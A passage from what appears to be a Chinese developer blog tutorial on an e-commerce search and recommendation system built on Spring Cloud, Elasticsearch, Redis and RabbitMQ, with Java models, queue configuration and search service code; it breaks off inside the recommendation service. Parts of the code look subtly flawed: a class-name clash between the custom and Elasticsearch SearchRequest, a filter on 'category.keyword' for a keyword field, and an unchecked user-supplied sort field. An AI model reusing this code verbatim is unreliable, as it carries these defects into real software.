.hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">基于SpringCloud + Elasticsearch + Redis + RabbitMQ 构建高性能电商搜索与个性化推荐系统</h2>
<p>在电商平台的核心链路中，搜索与推荐直接决定了用户体验与转化效率。传统数据库搜索面临精准度低、响应缓慢、推荐同质化等问题，而消息队列的引入能有效解决数据实时同步、系统解耦等关键诉求。本文将基于 <strong>SpringCloud + ElasticSearch + Redis + RabbitMQ</strong> 技术栈，从架构设计、核心实现到性能优化，完整拆解一套可落地的电商实时搜索与个性化推荐方案，重点突出 RabbitMQ 在数据同步、事件分发中的核心作用。</p>
<h3 data-id="heading-1">一、系统痛点与核心目标</h3>
<h4 data-id="heading-2">1. 传统方案的核心痛点</h4>
<ul>
<li>搜索精准度不足：用户搜索 “华为手机” 却返回无关商品，多字段匹配能力薄弱；</li>
<li>响应速度缓慢：数据库全表扫描导致搜索耗时超 3 秒，用户直接流失；</li>
<li>推荐缺乏个性化：千篇一律的商品列表，无法贴合用户兴趣偏好；</li>
<li>数据同步滞后：商品上下架、价格变更无法实时反映到搜索结果；</li>
<li>系统耦合严重：商品服务与搜索服务直接依赖，扩展性差，故障传导风险高。</li>
</ul>
<h4 data-id="heading-3">2. 系统核心目标</h4>
<ul>
<li>高性能：搜索响应时间控制在毫秒级，支持每秒千级并发；</li>
<li>高精准：支持全文搜索、模糊匹配、分类过滤、搜索建议，精准识别用户意图；</li>
<li>个性化：基于用户行为数据，实现 “千人千面” 的推荐效果；</li>
<li>实时性：商品数据变更实时同步至搜索引擎，数据延迟低于 1 秒；</li>
<li>高可用：分布式架构设计，服务解耦，支持横向扩展，故障隔离。</li>
</ul>
<h3 data-id="heading-4">二、技术选型与架构设计</h3>
<h4 data-id="heading-5">1. 核心技术栈选型</h4>













































<table><thead><tr><th>技术组件</th><th>版本选择</th><th>核心作用</th></tr></thead><tbody><tr><td>SpringCloud</td><td>2023.0.0</td><td>微服务架构底座，提供服务注册发现、负载均衡、网关路由等能力</td></tr><tr><td>Elasticsearch</td><td>7.x</td><td>全文搜索与分析引擎，支撑多字段检索、模糊匹配、搜索建议等核心功能</td></tr><tr><td>Redis</td><td>6.x</td><td>高速缓存组件，缓存热点商品、用户行为、推荐结果，降低底层存储访问压力</td></tr><tr><td>RabbitMQ</td><td>3.12.x</td><td>消息队列，实现商品数据实时同步、用户行为采集、系统解耦与故障隔离</td></tr><tr><td>MySQL</td><td>8.x</td><td>主数据存储，持久化商品基础信息、用户行为明细、订单数据等核心业务数据</td></tr><tr><td>SpringBoot</td><td>3.2.x</td><td>微服务开发框架，简化配置与开发流程</td></tr><tr><td>IK Analyzer</td><td>7.17.0</td><td>中文分词器，提升中文搜索的精准度</td></tr></tbody></table>
<h4 data-id="heading-6">2. 整体架构设计</h4>
<p>系统采用 “事件驱动 + 微服务” 架构，基于 RabbitMQ 实现核心链路解耦，整体分为五大核心模块，形成 “数据采集 - 实时同步 - 精准检索 - 个性化推荐 - 缓存加速” 的完整闭环：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/74233a0ffbc54440b22e7fee22cf4b74~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ5rC05LiN5ru0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769428065&amp;x-signature=qOEUYAKxVjPDyyXFzS87Dpov7Tw%3D" alt="image.png" loading="lazy"/></p>
<h5 data-id="heading-7">核心链路说明</h5>
<ol>
<li><strong>数据采集链路</strong>：用户行为（浏览、购买、收藏）通过 RabbitMQ 异步采集，存储至 Redis（缓存）与 MySQL（持久化）；</li>
<li><strong>数据同步链路</strong>：商品服务触发变更事件，通过 RabbitMQ 路由至商品同步队列，由消费端同步至 Elasticsearch，失败消息进入死信队列重试；</li>
<li><strong>搜索检索链路</strong>：用户搜索请求经 API 网关路由至搜索服务，通过 Elasticsearch 实现精准检索与搜索建议；</li>
<li><strong>个性化推荐链路</strong>：推荐服务读取 Redis 中的用户行为数据，结合协同过滤与内容推荐算法，生成个性化推荐列表；</li>
<li><strong>缓存加速链路</strong>：Redis 缓存热点商品、搜索结果、推荐列表，缩短响应时间，提升系统吞吐量。</li>
</ol>
<h3 data-id="heading-8">三、核心功能实现</h3>
<h4 data-id="heading-9">1. 数据模型设计</h4>
<h5 data-id="heading-10">1.1 Elasticsearch 商品文档模型</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Document(indexName = "products")</span>
<span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductDocument</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-keyword">private</span> String id;

    <span class="hljs-comment">// 商品名称，分词+权重提升，搜索优先级最高</span>
    <span class="hljs-meta">@Field(type = FieldType.Text, analyzer = "ik_max_word", searchAnalyzer = "ik_smart")</span>
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-comment">// 商品描述，分词索引</span>
    <span class="hljs-meta">@Field(type = FieldType.Text, analyzer = "ik_max_word")</span>
    <span class="hljs-keyword">private</span> String description;

    <span class="hljs-comment">// 分类，keyword类型不分词，用于精确过滤</span>
    <span class="hljs-meta">@Field(type = FieldType.Keyword)</span>
    <span class="hljs-keyword">private</span> String category;

    <span class="hljs-comment">// 品牌，keyword类型不分词</span>
    <span class="hljs-meta">@Field(type = FieldType.Keyword)</span>
    <span class="hljs-keyword">private</span> String brand;

    <span class="hljs-comment">// 价格，数值类型用于范围查询与排序</span>
    <span class="hljs-meta">@Field(type = FieldType.Double)</span>
    <span class="hljs-keyword">private</span> BigDecimal price;

    <span class="hljs-comment">// 商品图片URL</span>
    <span class="hljs-meta">@Field(type = FieldType.Keyword)</span>
    <span class="hljs-keyword">private</span> String imageUrl;

    <span class="hljs-comment">// 销量，用于热门排序</span>
    <span class="hljs-meta">@Field(type = FieldType.Long)</span>
    <span class="hljs-keyword">private</span> Long salesVolume;

    <span class="hljs-comment">// 评分，用于优质商品排序</span>
    <span class="hljs-meta">@Field(type = FieldType.Float)</span>
    <span class="hljs-keyword">private</span> Float rating;

    <span class="hljs-comment">// 标签，多值keyword</span>
    <span class="hljs-meta">@Field(type = FieldType.Keyword)</span>
    <span class="hljs-keyword">private</span> List&lt;String&gt; tags;

    <span class="hljs-comment">// 创建时间</span>
    <span class="hljs-meta">@Field(type = FieldType.Date)</span>
    <span class="hljs-keyword">private</span> Date createTime;

    <span class="hljs-comment">// 更新时间</span>
    <span class="hljs-meta">@Field(type = FieldType.Date)</span>
    <span class="hljs-keyword">private</span> Date updateTime;

    <span class="hljs-comment">// 搜索建议字段，用于自动补全</span>
    <span class="hljs-meta">@CompletionField</span>
    <span class="hljs-keyword">private</span> Completion suggest;

    <span class="hljs-comment">// 构建搜索建议数据</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">buildSuggest</span><span class="hljs-params">()</span> {
        <span class="hljs-built_in">this</span>.suggest = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Completion</span>(ImmutableMap.of(
                <span class="hljs-string">"input"</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]{<span class="hljs-built_in">this</span>.name, <span class="hljs-built_in">this</span>.brand},
                <span class="hljs-string">"weight"</span>, <span class="hljs-number">1</span>
        ));
    }
}
</code></pre>
<h5 data-id="heading-11">1.2 核心 DTO 与事件模型</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 商品DTO</span>
<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@Builder</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductDTO</span> {
    <span class="hljs-keyword">private</span> String id;
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> BigDecimal price;
    <span class="hljs-keyword">private</span> String imageUrl;
    <span class="hljs-keyword">private</span> String category;
    <span class="hljs-keyword">private</span> String brand;
    <span class="hljs-keyword">private</span> Long salesVolume;
    <span class="hljs-keyword">private</span> Float rating;
}

<span class="hljs-comment">// 搜索请求参数</span>
<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@Builder</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SearchRequest</span> {
    <span class="hljs-keyword">private</span> String keyword;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">page</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;
    <span class="hljs-keyword">private</span> String category;
    <span class="hljs-keyword">private</span> String sortField;
    <span class="hljs-keyword">private</span> String sortOrder;
    <span class="hljs-keyword">private</span> String userId;
}

<span class="hljs-comment">// 商品变更事件</span>
<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@AllArgsConstructor</span>
<span class="hljs-meta">@NoArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductChangeEvent</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;
    <span class="hljs-keyword">private</span> String productId;
    <span class="hljs-keyword">private</span> Product product;
    <span class="hljs-keyword">private</span> EventType eventType; <span class="hljs-comment">// CREATE/UPDATE/DELETE</span>

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">EventType</span> {
        CREATE, UPDATE, DELETE
    }
}

<span class="hljs-comment">// 用户行为事件</span>
<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@AllArgsConstructor</span>
<span class="hljs-meta">@NoArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserBehaviorEvent</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;
    <span class="hljs-keyword">private</span> String userId;
    <span class="hljs-keyword">private</span> String productId;
    <span class="hljs-keyword">private</span> String behaviorType; <span class="hljs-comment">// VIEW/BUY/COLLECT</span>
    <span class="hljs-keyword">private</span> String category;
    <span class="hljs-keyword">private</span> String brand;
    <span class="hljs-keyword">private</span> Date createTime;
}
</code></pre>
<h4 data-id="heading-12">2. RabbitMQ 配置（核心）</h4>
<p>实现交换机、队列、绑定关系配置，以及消息生产者 / 消费者模板：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RabbitMQConfig</span> {

    <span class="hljs-comment">// 交换机名称</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">PRODUCT_EXCHANGE</span> <span class="hljs-operator">=</span> <span class="hljs-string">"product.exchange"</span>;
    <span class="hljs-comment">// 商品同步队列</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">PRODUCT_SYNC_QUEUE</span> <span class="hljs-operator">=</span> <span class="hljs-string">"product.sync.queue"</span>;
    <span class="hljs-comment">// 用户行为队列</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">USER_BEHAVIOR_QUEUE</span> <span class="hljs-operator">=</span> <span class="hljs-string">"user.behavior.queue"</span>;
    <span class="hljs-comment">// 死信队列</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEAD_LETTER_QUEUE</span> <span class="hljs-operator">=</span> <span class="hljs-string">"dead.letter.queue"</span>;
    <span class="hljs-comment">// 死信交换机</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEAD_LETTER_EXCHANGE</span> <span class="hljs-operator">=</span> <span class="hljs-string">"dead.letter.exchange"</span>;

    <span class="hljs-comment">// 1. 声明交换机（topic类型，支持路由键匹配）</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> TopicExchange <span class="hljs-title function_">productExchange</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// durable:持久化，autoDelete:不自动删除</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TopicExchange</span>(PRODUCT_EXCHANGE, <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>);
    }

    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> TopicExchange <span class="hljs-title function_">deadLetterExchange</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TopicExchange</span>(DEAD_LETTER_EXCHANGE, <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>);
    }

    <span class="hljs-comment">// 2. 声明队列（商品同步队列，绑定死信交换机）</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">productSyncQueue</span><span class="hljs-params">()</span> {
        Map&lt;String, Object&gt; args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        <span class="hljs-comment">// 绑定死信交换机</span>
        args.put(<span class="hljs-string">"x-dead-letter-exchange"</span>, DEAD_LETTER_EXCHANGE);
        <span class="hljs-comment">// 死信路由键</span>
        args.put(<span class="hljs-string">"x-dead-letter-routing-key"</span>, <span class="hljs-string">"sync.failed"</span>);
        <span class="hljs-comment">// 消息过期时间（10秒）</span>
        args.put(<span class="hljs-string">"x-message-ttl"</span>, <span class="hljs-number">10000</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Queue</span>(PRODUCT_SYNC_QUEUE, <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, args);
    }

    <span class="hljs-comment">// 用户行为队列</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">userBehaviorQueue</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Queue</span>(USER_BEHAVIOR_QUEUE, <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);
    }

    <span class="hljs-comment">// 死信队列</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">deadLetterQueue</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Queue</span>(DEAD_LETTER_QUEUE, <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);
    }

    <span class="hljs-comment">// 3. 绑定关系：交换机 -&gt; 商品同步队列</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">productSyncBinding</span><span class="hljs-params">(Queue productSyncQueue, TopicExchange productExchange)</span> {
        <span class="hljs-keyword">return</span> BindingBuilder.bind(productSyncQueue)
                .to(productExchange)
                .with(<span class="hljs-string">"product.sync"</span>); <span class="hljs-comment">// 路由键</span>
    }

    <span class="hljs-comment">// 绑定关系：交换机 -&gt; 用户行为队列</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">userBehaviorBinding</span><span class="hljs-params">(Queue userBehaviorQueue, TopicExchange productExchange)</span> {
        <span class="hljs-keyword">return</span> BindingBuilder.bind(userBehaviorQueue)
                .to(productExchange)
                .with(<span class="hljs-string">"user.behavior"</span>); <span class="hljs-comment">// 路由键</span>
    }

    <span class="hljs-comment">// 绑定关系：死信交换机 -&gt; 死信队列</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">deadLetterBinding</span><span class="hljs-params">(Queue deadLetterQueue, TopicExchange deadLetterExchange)</span> {
        <span class="hljs-keyword">return</span> BindingBuilder.bind(deadLetterQueue)
                .to(deadLetterExchange)
                .with(<span class="hljs-string">"sync.failed"</span>); <span class="hljs-comment">// 死信路由键</span>
    }

    <span class="hljs-comment">// 4. 消息生产者模板（JSON序列化）</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> RabbitTemplate <span class="hljs-title function_">rabbitTemplate</span><span class="hljs-params">(ConnectionFactory connectionFactory)</span> {
        <span class="hljs-type">RabbitTemplate</span> <span class="hljs-variable">rabbitTemplate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RabbitTemplate</span>(connectionFactory);
        <span class="hljs-comment">// 消息序列化方式：JSON</span>
        rabbitTemplate.setMessageConverter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Jackson2JsonMessageConverter</span>());
        <span class="hljs-comment">// 开启确认机制（确保消息到达交换机）</span>
        rabbitTemplate.setConfirmCallback((correlationData, ack, cause) -&gt; {
            <span class="hljs-keyword">if</span> (!ack) {
                log.error(<span class="hljs-string">"消息发送至交换机失败，cause: {}"</span>, cause);
            }
        });
        <span class="hljs-comment">// 开启返回机制（确保消息到达队列）</span>
        rabbitTemplate.setReturnsCallback(returned -&gt; {
            log.error(<span class="hljs-string">"消息发送至队列失败，routingKey: {}, replyText: {}"</span>,
                    returned.getRoutingKey(), returned.getReplyText());
        });
        <span class="hljs-keyword">return</span> rabbitTemplate;
    }

    <span class="hljs-comment">// 5. 消息消费者配置（JSON反序列化）</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> SimpleRabbitListenerContainerFactory <span class="hljs-title function_">rabbitListenerContainerFactory</span><span class="hljs-params">(ConnectionFactory connectionFactory)</span> {
        <span class="hljs-type">SimpleRabbitListenerContainerFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleRabbitListenerContainerFactory</span>();
        factory.setConnectionFactory(connectionFactory);
        factory.setMessageConverter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Jackson2JsonMessageConverter</span>());
        <span class="hljs-comment">// 并发消费者数量</span>
        factory.setConcurrentConsumers(<span class="hljs-number">3</span>);
        factory.setMaxConcurrentConsumers(<span class="hljs-number">5</span>);
        <span class="hljs-comment">// 每次拉取消息数量</span>
        factory.setPrefetchCount(<span class="hljs-number">10</span>);
        <span class="hljs-keyword">return</span> factory;
    }
}
</code></pre>
<h4 data-id="heading-13">3. 商品搜索服务实现</h4>
<h5 data-id="heading-14">3.1 搜索接口控制器</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/api/search")</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductSearchController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ProductSearchService productSearchService;

    <span class="hljs-comment">/**
     * 商品搜索接口（支持关键词、分类、排序）
     */</span>
    <span class="hljs-meta">@GetMapping("/products")</span>
    <span class="hljs-keyword">public</span> Result&lt;PageResult&lt;ProductDTO&gt;&gt; <span class="hljs-title function_">searchProducts</span><span class="hljs-params">(
            <span class="hljs-meta">@RequestParam</span> String keyword,
            <span class="hljs-meta">@RequestParam(defaultValue = "0")</span> <span class="hljs-type">int</span> page,
            <span class="hljs-meta">@RequestParam(defaultValue = "20")</span> <span class="hljs-type">int</span> size,
            <span class="hljs-meta">@RequestParam(required = false)</span> String category,
            <span class="hljs-meta">@RequestParam(required = false)</span> String sortField,
            <span class="hljs-meta">@RequestParam(required = false)</span> String sortOrder,
            HttpServletRequest request)</span> {
        
        <span class="hljs-comment">// 从请求头获取用户ID（用于个性化推荐）</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">"X-User-ID"</span>);

        <span class="hljs-comment">// 构建搜索请求参数</span>
        <span class="hljs-type">SearchRequest</span> <span class="hljs-variable">requestParams</span> <span class="hljs-operator">=</span> SearchRequest.builder()
                .keyword(keyword)
                .page(page)
                .size(size)
                .category(category)
                .sortField(sortField)
                .sortOrder(sortOrder)
                .userId(userId)
                .build();

        <span class="hljs-comment">// 执行搜索</span>
        PageResult&lt;ProductDTO&gt; result = productSearchService.search(requestParams);
        <span class="hljs-keyword">return</span> Result.success(result);
    }

    <span class="hljs-comment">/**
     * 搜索建议接口（自动补全）
     */</span>
    <span class="hljs-meta">@GetMapping("/suggest")</span>
    <span class="hljs-keyword">public</span> Result&lt;List&lt;String&gt;&gt; <span class="hljs-title function_">getSearchSuggestions</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String keyword)</span> {
        List&lt;String&gt; suggestions = productSearchService.getSuggestions(keyword);
        <span class="hljs-keyword">return</span> Result.success(suggestions);
    }
}
</code></pre>
<h5 data-id="heading-15">3.2 搜索服务核心逻辑</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductSearchService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ElasticsearchRestTemplate elasticsearchTemplate;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RedisTemplate&lt;String, Object&gt; redisTemplate;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ProductRecommendationService recommendationService;

    <span class="hljs-comment">/**
     * 执行商品搜索（检索+个性化推荐）
     */</span>
    <span class="hljs-keyword">public</span> PageResult&lt;ProductDTO&gt; <span class="hljs-title function_">search</span><span class="hljs-params">(SearchRequest request)</span> {
        <span class="hljs-comment">// 1. 构建Elasticsearch查询条件</span>
        <span class="hljs-type">NativeSearchQuery</span> <span class="hljs-variable">searchQuery</span> <span class="hljs-operator">=</span> buildSearchQuery(request);

        <span class="hljs-comment">// 2. 执行ES搜索</span>
        SearchHits&lt;ProductDocument&gt; searchHits = elasticsearchTemplate.search(
                searchQuery, ProductDocument.class);

        <span class="hljs-comment">// 3. 转换搜索结果为DTO</span>
        List&lt;ProductDTO&gt; productList = searchHits.getSearchHits().stream()
                .map(hit -&gt; convertToProductDTO(hit.getContent()))
                .collect(Collectors.toList());

        <span class="hljs-comment">// 4. 对登录用户应用个性化推荐（混合搜索结果与推荐结果）</span>
        <span class="hljs-keyword">if</span> (StringUtils.hasText(request.getUserId())) {
            productList = recommendationService.personalizeProducts(productList, request.getUserId());
        }

        <span class="hljs-comment">// 5. 记录搜索指标（用于热门搜索词分析）</span>
        recordSearchMetrics(request.getKeyword(), productList.size());

        <span class="hljs-comment">// 6. 构建分页结果</span>
        <span class="hljs-keyword">return</span> PageResult.&lt;ProductDTO&gt;builder()
                .data(productList)
                .total(searchHits.getTotalHits())
                .page(request.getPage())
                .size(request.getSize())
                .build();
    }

    <span class="hljs-comment">/**
     * 构建ES搜索查询（多字段+过滤+排序）
     */</span>
    <span class="hljs-keyword">private</span> NativeSearchQuery <span class="hljs-title function_">buildSearchQuery</span><span class="hljs-params">(SearchRequest request)</span> {
        <span class="hljs-type">BoolQueryBuilder</span> <span class="hljs-variable">boolQuery</span> <span class="hljs-operator">=</span> QueryBuilders.boolQuery();

        <span class="hljs-comment">// 关键词搜索：多字段匹配（名称权重3，描述权重2，品牌/分类权重1）</span>
        <span class="hljs-keyword">if</span> (StringUtils.hasText(request.getKeyword())) {
            <span class="hljs-type">MultiMatchQueryBuilder</span> <span class="hljs-variable">multiMatchQuery</span> <span class="hljs-operator">=</span> QueryBuilders.multiMatchQuery(
                    request.getKeyword(),
                    <span class="hljs-string">"name^3"</span>,  <span class="hljs-comment">// 商品名称权重最高</span>
                    <span class="hljs-string">"description^2"</span>,
                    <span class="hljs-string">"brand"</span>,
                    <span class="hljs-string">"category"</span>
            ).type(MultiMatchQueryBuilder.Type.BEST_FIELDS)
             .fuzziness(Fuzziness.AUTO); <span class="hljs-comment">// 支持模糊搜索（容错输入错误）</span>
            boolQuery.must(multiMatchQuery);
        }

        <span class="hljs-comment">// 分类过滤</span>
        <span class="hljs-keyword">if</span> (StringUtils.hasText(request.getCategory())) {
            boolQuery.filter(QueryBuilders.termQuery(<span class="hljs-string">"category.keyword"</span>, request.getCategory()));
        }

        <span class="hljs-comment">// 构建查询构建器</span>
        <span class="hljs-type">NativeSearchQueryBuilder</span> <span class="hljs-variable">queryBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeSearchQueryBuilder</span>()
                .withQuery(boolQuery)
                .withPageable(PageRequest.of(request.getPage(), request.getSize()));

        <span class="hljs-comment">// 排序配置（优先按用户指定字段排序，默认按相关性排序）</span>
        <span class="hljs-keyword">if</span> (StringUtils.hasText(request.getSortField())) {
            <span class="hljs-type">SortOrder</span> <span class="hljs-variable">sortOrder</span> <span class="hljs-operator">=</span> <span class="hljs-string">"desc"</span>.equalsIgnoreCase(request.getSortOrder()) 
                    ? SortOrder.DESC : SortOrder.ASC;
            queryBuilder.withSort(SortBuilders.fieldSort(request.getSortField()).order(sortOrder));
        } <span class="hljs-keyword">else</span> {
            queryBuilder.withSort(SortBuilders.scoreSort().order(SortOrder.DESC));
        }

        <span class="hljs-keyword">return</span> queryBuilder.build();
    }

    <span class="hljs-comment">/**
     * 获取搜索建议（基于ES的Completion Suggester）
     */</span>
    <span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">getSuggestions</span><span class="hljs-params">(String keyword)</span> {
        <span class="hljs-comment">// 构建搜索建议器</span>
        <span class="hljs-type">CompletionSuggestionBuilder</span> <span class="hljs-variable">suggestionBuilder</span> <span class="hljs-operator">=</span> SuggestBuilders
                .completionSuggestion(<span class="hljs-string">"suggest"</span>)
                .prefix(keyword)
                .size(<span class="hljs-number">10</span>); <span class="hljs-comment">// 返回Top10建议</span>

        <span class="hljs-comment">// 构建建议请求</span>
        <span class="hljs-type">SuggestBuilder</span> <span class="hljs-variable">suggestBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SuggestBuilder</span>()
                .addSuggestion(<span class="hljs-string">"product_suggest"</span>, suggestionBuilder);

        <span class="hljs-type">SearchRequest</span> <span class="hljs-variable">searchRequest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SearchRequest</span>(<span class="hljs-string">"products"</span>);
        searchRequest.source(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SearchSourceBuilder</span>().suggest(suggestBuilder));

        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 执行建议查询</span>
            <span class="hljs-type">SearchResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> elasticsearchTemplate.getElasticsearchRestClient()
                    .search(searchRequest, RequestOptions.DEFAULT);

            <span class="hljs-comment">// 解析建议结果</span>
            <span class="hljs-type">Suggest</span> <span class="hljs-variable">suggest</span> <span class="hljs-operator">=</span> response.getSuggest();
            <span class="hljs-type">CompletionSuggestion</span> <span class="hljs-variable">suggestion</span> <span class="hljs-operator">=</span> suggest.getSuggestion(<span class="hljs-string">"product_suggest"</span>);
            <span class="hljs-keyword">return</span> suggestion.getEntries().stream()
                    .flatMap(entry -&gt; entry.getOptions().stream())
                    .map(option -&gt; option.getText().toString())
                    .collect(Collectors.toList());
        } <span class="hljs-keyword">catch</span> (Exception e) {
            log.error(<span class="hljs-string">"获取搜索建议失败，keyword: {}"</span>, keyword, e);
            <span class="hljs-keyword">return</span> Collections.emptyList();
        }
    }

    <span class="hljs-comment">// 辅助方法：记录搜索指标、DTO转换（略，同前文Kafka方案）</span>
}
</code></pre>
<h4 data-id="heading-16">4. 个性化推荐服务实现</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductRecommendationService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RedisTemplate&lt;String, Object&gt; redisTemplate;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ElasticsearchRestTemplate elasticsearchTemplate;

